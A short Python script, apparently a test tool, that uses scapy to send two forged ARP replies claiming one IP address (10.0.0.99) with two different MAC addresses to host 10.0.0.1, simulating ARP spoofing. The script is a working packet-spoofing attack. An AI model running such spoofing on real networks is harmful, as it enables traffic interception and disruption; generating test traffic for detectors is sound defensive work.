from scapy.all import ARP, send

# simule deux MAC pour une même IP (spoofing)
packets = [
    ARP(op=2, psrc="10.0.0.99", hwsrc="11:22:33:44:55:66", pdst="10.0.0.1"),
    ARP(op=2, psrc="10.0.0.99", hwsrc="aa:bb:cc:dd:ee:ff", pdst="10.0.0.1"),
]

print("[*] Envoi de paquets ARP spoofés...")
send(packets, count=1, inter=0.5)
print("[*] Terminé.")
